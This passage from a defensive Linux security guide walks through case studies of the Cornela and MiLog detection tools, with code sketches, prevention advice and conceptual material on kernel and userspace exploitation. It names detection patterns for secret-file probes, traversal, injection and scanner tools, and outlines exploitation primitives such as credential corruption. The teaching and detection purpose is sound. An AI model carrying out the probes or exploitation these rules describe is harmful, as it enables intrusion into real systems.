- kernel control attempts
  Cornela watches `bpf`, module-loading, capability changes, and keyring activity because these are high-signal interactions with privileged kernel mechanisms.
- weak container posture
  Cornela audits capabilities, seccomp, `NoNewPrivs`, namespaces, risky mounts, and runtime hints because exploitability is shaped by exposure plus isolation weakness.

This is important for defenders:

```text
Cornela is not trying to recognize one exploit.
Cornela is trying to recognize risky kernel-boundary behavior classes.
```

## Part 17: Case Study: What Cornela Contributes In Practice

**Level: Intermediate.**

Cornela does not patch the kernel and it does not block syscalls itself. Its value is that it makes kernel risk visible and actionable.

It helps reduce risk by:

- identifying likely Copy Fail exposure signals
- showing whether the host appears inside an affected kernel range heuristic
- showing whether `algif_aead` and AF_ALG exposure are present
- showing whether seccomp or LSM hardening is missing
- finding container isolation gaps such as risky capabilities or host namespace sharing
- detecting runtime syscall sequences associated with Copy Fail-style behavior
- producing JSON and JSONL output for CI, logging, and security pipelines

This is prevention through visibility, prioritization, and faster remediation.

## Part 18: Case Study: Auditing Methodology From MiLog

**Level: Intermediate → Advanced.** The early sections (log-based detection, baseline + drift) are Intermediate. The eBPF sidecar architecture is Advanced.

**Beginner sidebar.** This Part is partly a study of *how* a defensive tool is built, not just what it does. If a section feels too much like reading source code, skim it for the design principle and move on. The principles transfer; the implementation details do not have to.

After the shared-kernel case study, the book widens into host auditing and request-layer detection so the reader can see how low-level knowledge connects to broader defensive operations.

A strong DevSecOps learning path also needs application-edge and host-integrity auditing. The `milog` project is useful as a case study because it shows three practical detection styles:

- outside-in log analysis of attacker traffic
- point-in-time drift auditing of host state
- inside-out runtime observation with an eBPF sidecar

Those three styles complement each other:

```text
HTTP request layer       -> what attackers are trying
host drift layer         -> what changed on disk / accounts / ports
runtime probe layer      -> what processes are doing right now
```

For blue team, this teaches how to build layered detection. For red team, it teaches what kinds of activity are visible, how detectors reason, and where defenders are strong or weak.

### 1. Log-Based Exploit Detection

`milog exploits` and `milog probes` work from nginx access logs, not from packet capture and not from kernel telemetry.

Technically, the approach is:

- tail logs continuously with `tail -F` so rotation is survived
- run a case-insensitive pattern match over each line
- classify the match into a category
- derive a fingerprint from the request
- pass only fresh, non-cooled-down events into the alert path

Here, a fingerprint means a compact identity for one suspicious event, for example an IP plus path combination. A cooldown means suppressing repeated alerts for a short window so one noisy source does not page the operator continuously.

The pattern sets are deliberately broad and operational:

- path traversal and LFI indicators such as `../`, encoded dot-dot, and sensitive file targets
- infrastructure probes such as Docker API, actuator, admin panels, embedded-device paths
- WordPress and phpMyAdmin scan paths
- dotfile and secret-file probes such as `.env`, `.git`, `.ssh`
- SQLi and XSS indicators
- log4shell-style strings
- scanner user agents such as `masscan`, `zgrab`, `sqlmap`, `nuclei`, `gobuster`
- protocol mistakes such as SSH banners or TLS bytes hitting plain HTTP

This is not vulnerability proof. It is intent detection:

```text
request pattern suggests recon, scanning, or exploitation attempt
```

That distinction matters. A log heuristic can tell you:

- someone attempted traversal
- someone probed for a misconfigured API
- a known scanner touched the server

It cannot, by itself, prove successful compromise.

### 2. Why This Is Technically Useful

From a detection-engineering perspective, MiLog demonstrates an important idea:

- detection can start from cheap text signals
- you do not always need a full SIEM or packet sensor to get useful results
- good filtering and dedup often matter more than perfect classification

The `milog` design also shows why streaming text detectors must control noise:

- cooldown keys suppress repeated alerts on the same rule
- request fingerprints suppress cross-rule duplicates
- alert body encoding prevents attacker-controlled log content from breaking outbound notifications

That is a mature operational lesson. Detection quality is not only about finding bad events. It is about controlling alert volume and preventing attacker-controlled strings from abusing the alerting system itself.

### 3. Fingerprinting, Cooldown, And Dedup

MiLog’s alert path is worth studying because it solves a common detection problem.

One malicious request might match:

- an exploit-path rule
- a scanner user-agent rule
- a generic probe rule

Without dedup, one request becomes multiple noisy alerts.

MiLog addresses that by:

- using per-rule cooldown state keyed by rule ID
- using cross-rule event fingerprints such as `ip:path`
- recording state in flat files under the alert state directory
- applying silence rules on top when an operator is already triaging

This is a practical lesson for both blue and red teams:

- blue team should think in terms of event identity, not just rule identity
- red team should assume repeated recon patterns are likely to collapse into one visible signal rather than remain invisible

### 4. Host Integrity Auditing As Baseline And Drift

`milog audit` is architecturally different from `milog exploits`.

Instead of watching incoming traffic, it snapshots known-good host state and later checks for drift. This is a classic integrity-monitoring pattern:

```text
baseline known-good state
  -> periodically recapture a narrow signal
  -> compare current vs baseline
  -> alert only on meaningful drift
```

This is one of the most important auditing ideas in defensive engineering because many compromises are easier to catch as unauthorized change than as exploit execution.

In simple terms:

- baseline means "this is the known-good state we trust"
- drift means "the current state no longer matches that known-good state"

MiLog implements several variants of this pattern.

### 5. Accounts Audit

The accounts audit tracks high-value authentication and privilege files such as:

- `/etc/passwd`
- `/etc/sudoers`
- `authorized_keys`

Technically, the approach is line-level diffing rather than hashing the whole file only.

Why that matters:

- a new SSH key is semantically important even if the file is otherwise intact
- a sudoers addition should be shown as a specific added line
- line-level drift is easier for an operator to interpret than a raw hash mismatch

This is a good example of choosing a data model that matches the investigation need.

### 6. FIM: File Integrity Monitoring

MiLog’s FIM scanner uses SHA-256 baselines over a configurable watchlist.

FIM means File Integrity Monitoring. It is the practice of recording trusted file state and later checking whether important files changed unexpectedly.

Its technical approach includes:

- expanding configured path globs into a stable sorted watchlist
- recording path, digest, mtime, size, and baseline time
- treating missing files explicitly as a tracked state
- comparing later captures to detect `MODIFIED`, `APPEARED`, `REMOVED`, or `UNREADABLE`

This is not just "hash some files." It is a state machine over file existence and content.

That design matters because security-relevant drift includes more than modification:

- a file appearing where nothing existed before can be suspicious
- a file becoming unreadable can indicate permission tampering
- a tracked path removed after compromise cleanup can matter too

For blue team learning, this is a clean example of integrity state modeling.

### 7. Persistence Audit

The persistence scanner watches common re-entry surfaces such as:

- cron drops
- systemd unit locations
- `rc.local`
- shell startup files

The implementation strategy is narrower than FIM by design:

- it tracks file existence in persistence-heavy directories
- it alerts mainly on `APPEARED`
- it treats `REMOVED` as informational housekeeping

This is a strong design decision. The goal is not perfect filesystem accounting. The goal is high-signal persistence detection with low noise.

That is a useful lesson:

```text
good auditing often means tracking the signal that matters most, not every possible change
```

### 8. Ports Audit

The ports scanner captures listening sockets using `ss` and falls back to `netstat`.

Its approach is:

- snapshot protocol, bind address, and port
- diff the current listener set against baseline
- alert on newly listening services
- treat disappeared listeners as normal operational churn

This is a classic exposure-audit technique. It answers:

- did the host start exposing something new?
- is there an unexpected service bound after compromise?
- did a reverse shell or ad hoc admin service appear?

Notice what it does not try to do:

- process attribution in the baseline snapshot
- deep packet inspection
- privilege escalation to get richer socket metadata

That tradeoff is instructive. Simple and portable exposure snapshots are often more robust than over-privileged collectors.

### 9. Rootkit Heuristics

The rootkit mode is not baseline-based. It is heuristic-based and `/proc`-driven.

The checks include:

- hidden-process suspicion from `/proc` count versus `ps`
- presence of `/etc/ld.so.preload`
- executables launched from `/tmp`, `/var/tmp`, or similar transient paths
- deleted-but-still-running executables via `/proc/<pid>/exe`

This is a good example of point-in-time anomaly auditing:

- no signature feed
- no kernel module
- no claim of perfect rootkit detection
- just a collection of Linux post-exploitation smells that are cheap to test

Here, heuristic means a practical rule of thumb or suspicious pattern, not a guaranteed proof of compromise.

For learning, this is valuable because it shows how much mileage defenders can get from understanding normal Linux process and loader behavior.

### 10. YARA Scanning

MiLog also supports YARA scanning over selected paths such as webroots.

YARA is a pattern-matching system widely used in malware and webshell detection. A YARA rule describes suspicious strings, structures, or combinations of features that may indicate a malicious file.

The approach is pragmatic:

- shell out to the system `yara` binary
- initialize a conservative starter ruleset
- recursively scan configured directories
- record `(rule, file, sha)` tuples so repeated unchanged hits stay quiet

This is a very useful design for defenders because it separates:

- detection logic in YARA rules
- scan scheduling in the audit loop
- alert dedup in state files

It also shows a good engineering tradeoff:

- daily or periodic recursive scanning is often enough for webshell detection
- you do not need an always-on fsnotify agent to get meaningful value

### 11. eBPF Sidecar Probing

MiLog also has a Go-side eBPF probe architecture that complements the bash log and audit layers.

A sidecar in this context means a separate helper process that performs a specialized job next to the main tool, instead of merging everything into one large privileged process.

The important design choices are:

- privileged eBPF work is split into a separate binary
- each probe stream runs independently so one verifier failure does not kill all coverage
- userspace rule matching is OS-independent and unit-testable
- probe hits shell back into MiLog’s existing alert path instead of inventing parallel routing state

This is a strong systems-design lesson:

```text
keep privileged collection narrow
keep rule logic testable in userspace
reuse the existing alert pipeline
```

Unit-testable means the userspace rule logic can be tested like normal application code without having to load eBPF programs into a live kernel for every test.

The rule engine then reasons over normalized events such as:

- process exec events
- outbound TCP connect events
- file events
- ptrace events
- kernel module load events

Example behavioral rules include:

- shell spawned from a web worker
- binary executed from `/tmp`
- suspicious outbound connections
- ptrace-style process injection attempts
- kernel module load events

This gives you a runtime-behavior model rather than only a traffic or file-change model.

### 12. Blue-Team Learning Value

From a blue-team perspective, MiLog teaches several reusable principles:

- attacker requests are often visible before compromise
- successful compromise often becomes visible as unauthorized drift
- runtime behavior can confirm or raise priority on those earlier signals
- alerting systems need cooldown, dedup, and sanitization as first-class features
- not every detector needs the same fidelity or privilege level

In other words:

```text
cheap signals + narrow baselines + selective runtime telemetry = practical detection stack
```

### 13. Red-Team Learning Value

From a red-team perspective, MiLog is also useful as a study tool because it reveals what commodity operator behavior tends to expose.

Examples:

- noisy scan paths and recognizable user agents are obvious
- writing persistence files in common locations is easy to baseline and catch
- dropping binaries into `/tmp` is visible
- opening unexpected listeners is visible
- web-worker-to-shell transitions are strong behavioral indicators

That does not mean detection is impossible to evade. It means defenders who instrument these layers force attackers away from lazy, default, high-signal tradecraft.

For DevSecOps learning, that is the right lesson: raise attacker cost through layered visibility.

### 14. How The Case Studies Fit Together

Cornela and MiLog illustrate different but complementary parts of the same defensive story.

- MiLog is strong at edge traffic, host drift, and userland/runtime audit signals
- Cornela is strong at shared-kernel exposure, container isolation gaps, and kernel-boundary syscall sequences

Together they form a better learning model:

```text
request intent
  -> host drift
  -> process behavior
  -> kernel-boundary behavior
```

That stack is a very good mental model for blue-team and red-team DevSecOps work.

## Part 19: What Prevention Looks Like

**Level: Beginner → Intermediate.** A practical, advice-focused chapter that pulls earlier ideas into a layered prevention plan. Safe to read at any experience level.

Once the technical mechanisms and case studies are in place, the book can step back and ask the practical question every DevSecOps engineer eventually has to answer: what should we actually do about all this?

If you want to prevent or reduce this class of risk, focus on layers.

The layered model looks like this:

```text
patch the kernel
  -> reduce reachable attack surface
  -> strengthen workload isolation
  -> monitor runtime behavior
  -> review and improve platform defaults
```

### Layer 1: Patch Management

The best fix for a kernel vulnerability is a vendor-fixed kernel and a reboot into that fixed kernel.

DevSecOps lesson:

- package update alone is not enough if the running kernel has not changed

### Layer 2: Attack Surface Reduction

Reduce unnecessary access to dangerous kernel interfaces.

Examples:

- block unnecessary `AF_ALG` access with seccomp
- avoid loading unnecessary kernel modules
- remove broad capabilities
- avoid privileged containers unless absolutely required

### Layer 3: Stronger Isolation

Do not treat all containers equally.

Higher-risk workloads should be isolated through approaches such as:

- dedicated nodes
- microVMs
- sandboxed runtimes
- stricter seccomp and LSM policy
- less sharing with privileged system components

### Layer 4: Runtime Detection

If an attacker or a test workload reaches a dangerous syscall pattern, you want detection before or during impact.

This is where tools like Cornela help:

- it gives you host and container context
- it preserves event timelines
- it highlights high-signal kernel-boundary activity

### Layer 5: Secure Platform Defaults

A strong platform baseline should include:

- seccomp enabled by default
- AppArmor or SELinux enabled
- unnecessary capabilities dropped
- `NoNewPrivs` used where possible
- no Docker socket mounts in normal application containers
- no host PID or host network unless justified
- separation between untrusted workloads and privileged node agents

## Part 20: What To Study From Linux Kernel Programming

**Level: Intermediate.** A guided study list pointing back into the *Linux Kernel Programming* companion text. No new content; mostly a map.

This chapter serves as a reading bridge between the conceptual material in this book and a more formal kernel-focused study path.

If you use *Linux Kernel Programming* as a companion text, the most relevant learning areas for this guide are:

- kernel architecture and syscall flow
- loadable kernel modules
- processes and threads
- process and kernel stacks
- process virtual address space and VM split
- memory-management internals
- kernel memory allocation
- page allocator and slab allocator behavior
- CPU scheduling
- process states, scheduling classes, and CFS basics
- kernel synchronization and locking
- critical sections, atomicity, mutexes, spinlocks, and interrupt-aware locking

These topics matter for security because they explain where bug classes come from:

- memory-management mistakes lead to corruption or disclosure
- bad allocation and object lifetime handling lead to heap bugs
- synchronization mistakes lead to races and use-after-free issues
- module and subsystem complexity increase attack surface

The book is strongest as a foundation for understanding how the kernel is built and why low-level mistakes become security issues. This document then extends that foundation into attack-surface thinking, exploit-shape thinking, and defensive detection.

## Part 21: A DevSecOps Learning Roadmap

**Level: Beginner.** A study sequence with no prerequisites — useful from day one as a map of where to go next.

The book then translates the material into a study sequence so readers can keep building skill after finishing the chapters.

If you want to pursue DevSecOps seriously, learn these topics in order:

1. Linux process model, files, permissions, and syscalls
2. Namespaces, cgroups, capabilities, seccomp, and LSMs
3. How containers map to Linux primitives
4. Basic kernel memory ideas such as page cache and file-backed pages
5. Kernel architecture, memory allocation, scheduling, and synchronization
6. Common bug classes: buffer overflow, use-after-free, out-of-bounds access, integer bugs, races, and unintended writes
7. eBPF basics for observability and detection
8. Threat modeling for shared-kernel platforms
9. Hardening and detection pipelines for production systems

The professional goal is not "be good at exploitation." The goal is:

```text
understand enough low-level behavior to design better prevention
```

## Part 22: A Safe Way To Learn With Cornela As A Case Study

**Level: Beginner → Intermediate.** A guided lab walk-through; assumes you have a Linux VM and can run commands.

The next two chapters are practice-oriented. They are meant to turn theory into safe lab work.

Use Cornela in a defensive lab workflow.

Start with:

```bash
cornela audit
cornela containers
cornela cve CVE-2026-31431
```

Then validate detection safely:

```bash
sudo cornela monitor --events --duration 30
python3 scripts/demo_copy_fail_signals.py
```

This does not exploit the kernel. It only generates the `AF_ALG` and `splice` signal shape Cornela is built to correlate.

The safe learning outcome is:

- understand the kernel path at a high level
- see how monitoring observes it
- connect low-level concepts to operational defense

## Part 23: A Safe Way To Learn With MiLog As A Case Study

**Level: Beginner → Intermediate.**

Use MiLog as a defensive lab for auditing methodology.

Recommended progression:

1. Read nginx access logs and predict which requests should match `milog exploits` or `milog probes`.
2. Create a clean baseline with `milog audit accounts baseline`, `milog audit fim baseline`, `milog audit persistence baseline`, and `milog audit ports baseline`.
3. Perform controlled provocations such as a fake SSH key, a config-file change, a new cron drop, or a temporary listener.
4. Observe which modes produce signal and why.
5. Compare traffic indicators, drift indicators, and runtime indicators as separate evidence types.

This is safe because the learning value comes from understanding detector design, not from proving real exploitation.

## Part 24: What These Case-Study Tools Do Not Replace

**Level: Intermediate.** A short, important reality check.

After the practice chapters, it is worth stating the limits of tooling clearly so the reader does not mistake observability for complete security.

Cornela and MiLog are useful learning and implementation examples, but their scope is specific.

They do not replace:

- kernel patching
- vendor advisories
- seccomp policy design
- AppArmor or SELinux
- stronger isolation technologies
- incident response
- secure cluster architecture

They do not replace:

- application security testing
- secure coding review
- network architecture controls
- centralized log retention and forensic readiness

Think of Cornela and MiLog as visibility and prioritization tools for different parts of Linux attack surface.

## Part 25: The Main Lessons To Remember

**Level: Beginner.** A summary chapter. If you could read only one Part as a refresher in six months, this is the one.

Before moving into implementation and advanced material, this chapter compresses the book into its most important ideas.

If you only keep a few ideas from this guide, keep these:

1. Containers usually share the host kernel.
2. Kernel bugs matter even when applications look isolated.
3. Attack surface is not just applications; it includes syscalls, drivers, filesystems, sockets, modules, and kernel control interfaces.
4. Buffer overflows, use-after-free, race conditions, and integer bugs are core kernel bug classes worth learning deeply.
5. Low-level exploitation often becomes visible as a sequence, not a single event.
6. Page cache and file-backed memory are important security concepts for modern Linux defense.
7. Good auditing combines traffic heuristics, host drift detection, and runtime behavior, not just one of them.
8. Prevention means patching, attack-surface reduction, stronger isolation, and runtime detection together.
9. Cornela and MiLog are useful implementation examples of how defenders can turn low-level knowledge into practical detection.

## Part 26: Implementation Examples

**Level: Advanced.** Real Rust, Go, C, and Bash. You can read the prose without writing code, but the code samples assume basic comfort with each language.

**Beginner sidebar.** Skip the syntax and read the comments and explanations. The point of this Part is "what shape does each idea take in real code?" — not "memorize this file."

The theory and case studies are now followed by implementation sketches, so the reader can see how design ideas become real code and data flows.

This section keeps the book practical. The goal is not to dump full source code, but to show the implementation shape behind the ideas discussed above.

### 1. Cornela Host Audit Logic

One important Cornela idea is that kernel-risk triage starts from host facts, not from exploit code. In practice, the host audit checks whether important Linux security signals are present:

```rust
let loaded_modules = read_loaded_modules();
let algif_aead_loaded = loaded_modules.iter().any(|module| module == "algif_aead");
let af_alg_available = Path::new("/proc/crypto").exists();
let seccomp_available =
    Path::new("/proc/sys/kernel/seccomp").exists() || read_status_seccomp().is_some();
let apparmor_enabled = read_trimmed("/sys/module/apparmor/parameters/enabled")
    .map(|value| matches!(value.as_str(), "Y" | "y" | "1"))
    .unwrap_or(false);
let selinux_enabled = Path::new("/sys/fs/selinux/enforce").exists();
```

Why this matters:

- `algif_aead_loaded` is a direct kernel-module exposure signal
- `/proc/crypto` is a cheap hint that kernel crypto interfaces are present
- seccomp, AppArmor, and SELinux are treated as hardening-state inputs

This is a good example of defensive audit engineering:

```text
read stable kernel-facing interfaces
  -> convert them into explicit security signals
  -> score exposure from combinations, not one fact alone
```

### 2. Cornela Exposure Scoring

Cornela does not claim exploit proof. It builds an exposure assessment from multiple signals:

```rust
if matches!(kernel_assessment.fixed_by_upstream_version, Some(false)) {
    assessment.add(
        RiskLevel::High,
        "kernel version falls in the upstream affected range heuristic",
    );
}

if host.algif_aead_loaded {
    assessment.add(RiskLevel::High, "algif_aead module is currently loaded");
}

if host.af_alg_available {
    assessment.add(
        RiskLevel::Medium,
        "kernel crypto API appears available to local processes",
    );
}
```

This shows a useful security-engineering pattern:

- version range is only one input
- module exposure is another input
- syscall reachability or subsystem availability is another input
- the final result is a prioritization output, not a forensic conclusion

### 3. Cornela eBPF Sequence Gating

Cornela’s kernel-side monitor is intentionally small. It does not stream every syscall forever. It first marks processes that open an `AF_ALG` socket, then only forwards later `splice()` events for those processes.

```c
SEC("tracepoint/syscalls/sys_enter_socket")
int trace_socket(struct trace_event_raw_sys_enter *ctx)
{
    int family = ctx->args[0];

    if (family == AF_ALG) {
        __u32 tgid = bpf_get_current_pid_tgid() >> 32;
        __u8 marker = 1;
        bpf_map_update_elem(&af_alg_tgids, &tgid, &marker, BPF_ANY);
        submit_event(CORNELA_EVENT_AF_ALG_SOCKET, family);
    }
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_splice")
int trace_splice(struct trace_event_raw_sys_enter *ctx)
{
    __u32 tgid = bpf_get_current_pid_tgid() >> 32;
    if (!bpf_map_lookup_elem(&af_alg_tgids, &tgid)) {
        return 0;
    }
    submit_event(CORNELA_EVENT_SPLICE, 0);
    return 0;
}
```

This is an important design lesson:

- use a small kernel-side state map
- gate noisy events behind a higher-signal precursor
- push the expensive reasoning to userspace later

That is exactly how you keep eBPF useful without flooding userspace with noise.

### 4. MiLog FIM Baseline Model

MiLog’s file-integrity monitoring is not only “hash file and compare.” It stores a structured baseline with file state:

```bash
printf '%s\t%s\t%s\t%s\t%s\n' "$path" "$sha" "$mtime" "$size" "$now" >> "$tmp"
```

The later comparison logic distinguishes different drift types:

```bash
if [[ "$old_sha" == "MISSING" ]]; then
    printf 'APPEARED\t%s\t%s→%s\n' "$path" "$old_sha" "${new_sha:0:16}"
elif [[ "$old_sha" != "$new_sha" ]]; then
    printf 'MODIFIED\t%s\t%s→%s\n' "$path" "${old_sha:0:16}" "${new_sha:0:16}"
fi
```

This matters because defenders often need to model more than one bad state:

- modified file
- file that newly appeared
- removed file
- unreadable file after a permission change

That is a more realistic integrity model than a single “hash mismatch” boolean.

### 5. MiLog Listener Baseline

MiLog’s ports audit is a good example of how to build a useful exposure scanner without deep packet tooling:

```bash
ss -tulnH 2>/dev/null | awk '
    {
        proto = $1
        addr  = $5
        ...
        printf "%s\t%s\t%s\n", proto, bind, port
    }
' | sort -u
```

Then it compares current listeners to the baseline and alerts on new listeners only.

That design is operationally smart because:

- new listeners are usually the most important drift
- disappeared listeners are common during restarts
- the collector stays unprivileged and portable

### 6. MiLog Behavioral Rule Engine

MiLog’s Go probe layer is useful because it separates event collection from behavioral rules. A process exec event becomes a normalized object:

```go
type Event struct {
    PID        uint32
    PPID       uint32
    UID        uint32
    Comm       string
    ParentComm string
    Filename   string
}
```

Then the rule engine asks focused security questions. For example, shell-from-web-worker detection:

```go
if _, isShell := shellComms[e.Comm]; !isShell {
    return Hit{}, false
}
if _, isWebParent := webWorkerComms[e.ParentComm]; !isWebParent {
    return Hit{}, false
}
```

This is a strong engineering pattern:

- normalize runtime data first
- keep rule logic narrow and testable
- prefer high-signal parent-child relationships over vague anomaly scoring

### 7. Runtime Rule Example: Exec From Tmp

Another MiLog rule checks whether a process executed from common attacker drop locations:

```go
for _, prefix := range tmpExecPrefixes {
    if strings.HasPrefix(e.Filename, prefix) {
        return Hit{
            RuleKey: "process:exec_from_tmp:" + e.Comm,
            Title:   "Exec from tmp: " + e.Filename,
        }, true
    }
}
```

This is useful to study because it shows what a practical runtime detector often looks like:

- not a huge machine-learning model
- not a full sandbox
- just a precise rule tied to a strong post-exploitation pattern

### 8. Alert Safety Is Part Of Detection Engineering

MiLog also shows that alert delivery itself is part of the security design. Alert bodies may contain attacker-controlled strings from logs, so they must be escaped:

```bash
json_escape() {
    local s="${1-}"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\n'/\\n}"
    s="${s//$'\r'/\\r}"
    s="${s//$'\t'/\\t}"
    printf '"%s"' "$s"
}
```

This is not just implementation detail. It is part of secure monitoring design because the detector itself should not become a second injection surface.

## Part 27: Advanced Technical Chapters

**Level: Expert.** This is the deepest reasoning chapter in the book. If a section reads as "obvious," you are at expert level on that topic. If a section reads as "dense," that is normal — come back after a second pass through Parts 4 through 14.

This chapter assumes the earlier parts of the book already make sense to you. The goal here is not to reintroduce basic terms, but to connect them into the kinds of deeper models that experienced practitioners use when they reason about kernel exploitation, runtime detection, and hardening.

At this level, the important shift is:

```text
stop thinking in isolated facts
start thinking in primitives, object lifetimes, trust boundaries, and operational tradeoffs
```

### 1. Kernel Objects And Object Lifetime

A great deal of kernel exploitation becomes easier to understand once you stop thinking in terms of "the kernel" as one monolithic thing and start thinking in terms of objects.

Examples of kernel objects include:

- task structures for processes and threads
- file objects
- socket objects
- mount-related structures
- credential structures
- namespace objects
- keyring objects

These objects have lifetimes:

1. they are created
2. they are referenced
3. they may be shared
4. they are released
5. they are freed

Many serious kernel bugs happen when the code gets that lifetime wrong.

Common lifetime failures:

- using an object after it was freed
- freeing it too early
- freeing it twice
- failing to increment or decrement a reference properly
- racing between two code paths that disagree about whether the object is still valid

This is why reference counting is not a minor implementation detail. It is part of the security boundary around object lifetime.

### 2. Allocator Behavior And Why It Matters

Earlier chapters introduced the kernel heap and slab allocation. At a more advanced level, you should think about allocators in terms of object reuse and adjacency.

Security-relevant allocator questions include:

- what kinds of objects land in the same cache?
- when an object is freed, what can reuse that memory next?
- can attacker-controlled data be placed where a stale pointer later reads it?
- can one overflow reach neighboring objects or metadata?

This does not require exploit code to understand. It requires understanding the basic exploitation logic:

```text
corrupt object
  -> influence neighboring or reused object
  -> turn corruption into a usable primitive
```

From a defensive perspective, allocator hardening matters because it tries to make these steps less reliable.

### 3. Data Structures Matter More Than Headlines

A kernel CVE summary often sounds simple, but the technical impact depends on what data structure is being corrupted.

Examples:

- corrupting a buffer may only crash a task
- corrupting a credential structure may change privilege
- corrupting a function pointer may redirect execution
- corrupting mount or namespace state may weaken isolation
- corrupting a file-backed cache path may affect trusted later reads

This is why advanced analysis asks:

```text
what object was corrupted?
what field inside it matters?
what security decision depends on that field?
```

### 4. Exploitation Primitives In Practice

At an advanced level, it helps to think of exploitation as a search for increasingly useful primitives.

Typical progression:

1. information leak
2. limited read or write
3. stronger read or write
4. credential or policy corruption
5. stable privilege change or boundary escape

Not every exploit follows all those steps, but many do.

Information leaks matter because they may reveal:

- kernel addresses
- randomized layout details
- heap state hints
- object placement clues

Limited writes matter because a very small write may still be enough to:

- flip a flag
- alter a length
- corrupt a reference count
- change a permission bit
- damage a pointer field partially

Advanced defenders should stop thinking "small write sounds minor." In kernel space, the wrong one-byte or four-byte change can be enough.

### 5. Credential Corruption

Many Linux privilege-escalation discussions eventually reduce to credentials.

Credential structures matter because they represent security identity:

- effective user ID
- effective group ID
- capability masks
- related privilege state

If an attacker can make the kernel believe a process now has stronger credentials, many other checks become easier to bypass because the kernel itself now evaluates later actions differently.

This is one reason why data-only exploitation is so important. The attacker may not need dramatic control-flow hijack if the kernel can be tricked into trusting modified identity state.

### 6. Namespace And Mount Manipulation

Advanced container and sandbox escapes often involve namespace and mount logic even when the original bug was elsewhere.

Why:

- namespaces define visibility boundaries
- mount state defines filesystem visibility and interpretation
- many privileged workflows ultimately need filesystem or namespace effects

For defenders, namespace- and mount-related syscalls are important not because they are always malicious, but because they often appear in sequences related to isolation changes, filesystem trickery, or escape preparation.

This is why detection based on:

- `unshare`
- `setns`
- `mount`
- `open_tree`
- `move_mount`

can be operationally useful even when any one of those calls alone is not proof of compromise.

### 7. Race Conditions As State-Model Failures

At a beginner level, race conditions sound like "timing bugs." At an advanced level, they are better understood as state-model failures.

Two code paths disagree about the world:

- one path thinks the object is valid
- another path frees or changes it
- one path checks a condition
- another path changes the condition before the first path acts

This is why race exploitation often involves:

- repeated attempts
- careful timing
- pressure on scheduler behavior
- object churn

For blue team and platform defenders, the main lesson is not "timing bugs are spooky." It is:

```text
concurrency is part of the attack surface
```

### 8. Mitigation-Aware Exploitation Thinking

Advanced practitioners do not ask only "is there a bug?" They ask:

- what mitigations are enabled?
- what primitive is still realistic under those mitigations?
- what would the attacker need next?

For example:

- if KASLR is present, is there also an information leak?
- if stack canaries exist, is the attack still data-only?
- if module loading is blocked, is eBPF load still available?
- if seccomp is tight, are the needed syscalls even reachable?
- if AppArmor or SELinux are enforced, what secondary actions would still be denied?

This is one reason kernel hardening is valuable even when it does not eliminate the underlying bug. It changes attacker economics.

### 9. Advanced eBPF Design Tradeoffs

At a basic level, eBPF feels like "attach and observe." At a more advanced level, you need to think in tradeoffs:

- which hook gives the right semantics?
- how much noise will that hook generate?
- what state must be tracked in-kernel versus userspace?
- how much event loss is acceptable?
- what happens if one probe fails to load?
- how portable is this across kernels?

These are design questions, not just coding questions.

Tracepoint vs deeper hook tradeoff:

- tracepoints are usually more stable
- lower-level hooks may expose richer detail
- richer detail often means more version sensitivity and more noise

Kernel-side vs userspace logic tradeoff:

- more kernel-side logic can reduce event volume
- too much kernel-side logic increases complexity and verifier pressure
- more userspace logic is easier to test and evolve
- too much userspace processing can become expensive if the event stream is noisy

### 10. Event Semantics Versus Raw Events

A mature detector does not confuse raw events with meaningful events.

Examples:

- raw event: `splice()` happened
- meaningful event: a process previously opened `AF_ALG` and now used `splice()` within a relevant window

Another example:

- raw event: a shell executed
- meaningful event: a web worker spawned an interactive shell unexpectedly

This distinction is fundamental in advanced detection engineering.

High-quality detectors often transform:

```text
raw telemetry
  -> context enrichment
  -> semantic correlation
  -> risk-ranked finding
```

### 11. False Positives, False Negatives, And Detection Economics

Advanced defenders accept that perfect visibility does not exist.

Every detector has tradeoffs:

- broader rules catch more but increase noise
- narrower rules reduce noise but miss edge cases
- expensive enrichment improves context but may limit scale
- tight cooldowns reduce alert floods but can hide repeated events

The right question is not:

```text
is this detector perfect?
```

The right question is:

```text
does this detector produce useful signal at acceptable operational cost?
```

That mindset is crucial in both blue-team engineering and red-team emulation.

### 12. Multi-Layer Reasoning

The strongest practical understanding comes from reasoning across layers:

- application layer
- userspace process layer
- kernel syscall layer
- kernel object/state layer
- infrastructure placement layer

Example:

```text
weird HTTP request
  -> suspicious process child
  -> unusual syscall sequence
  -> changed host state
  -> possible boundary escape risk
```

A beginner sees those as separate dashboards. An advanced practitioner sees one story unfolding across layers.

### 13. Blue-Team And Red-Team Differences At This Level

At an advanced level, blue team and red team ask different questions about the same system.

Blue team asks:

- where is the highest-signal visibility point?
- which kernel boundary changes matter most?
- how can I reduce reachable attack surface?
- how do I keep detection noise survivable?

Red team asks:

- which interfaces are reachable?
- which hardening layers are present?
- where are the weakly monitored transitions?
- which default behaviors create obvious signal and should be avoided?

DevSecOps benefits from understanding both because prevention, hardening, and detection improve when you can reason about attacker tradeoffs as well as defender tradeoffs.

### 14. What Expert Progression Looks Like

If you already understand the earlier chapters, the path toward expert practice usually looks like this:

1. Move from knowing terms to reasoning about state transitions.
2. Move from thinking about bugs to thinking about primitives.
3. Move from isolated events to correlated stories across layers.
4. Move from "is this vulnerable?" to "what can actually be reached and operationalized here?"
5. Move from tool usage to subsystem-level understanding.

That is the point where Linux security work starts to feel less like memorizing commands and more like systems reasoning.

## Part 28: Userspace Binary Exploitation Foundations

**Level: Intermediate → Advanced.** Sections 1 through 8 are Intermediate (memory layout, ELF, GOT/PLT, calling conventions, the stack-overflow story, mitigations). Sections 9 through 14 (format strings, glibc heap internals, heap exploitation) are Advanced.

**Beginner sidebar.** This is the longest Part in the book. Read it in two passes. First pass: read every section's first paragraph and skip the rest. You will get the *shape* of userspace exploitation. Second pass: come back, slow down, and study sections 6 through 12 — that is where the real density is.

Kernel exploitation rests on the same primitives as userspace binary exploitation, but with stricter rules. Most learners build their intuition by first understanding the userspace side. This chapter is a defensive walkthrough of that landscape — the same vocabulary you will see in CTF writeups, Project Zero posts, and exploit advisories.

### 1. Why DevSecOps Should Care About Userspace Exploitation

You may not be writing exploits, but you will read incident reports, CVE advisories, and detection rules that assume this language. If you do not understand what "GOT overwrite," "ret2libc," or "tcache poison" mean, you cannot accurately reason about severity, exploitability, or detection.

The goal of this chapter is fluency, not weaponization.

### 2. Process Memory Layout

A typical Linux process has a layout roughly like:

```text
+----------------------+ high addresses
| stack (grows down)   |
+----------------------+
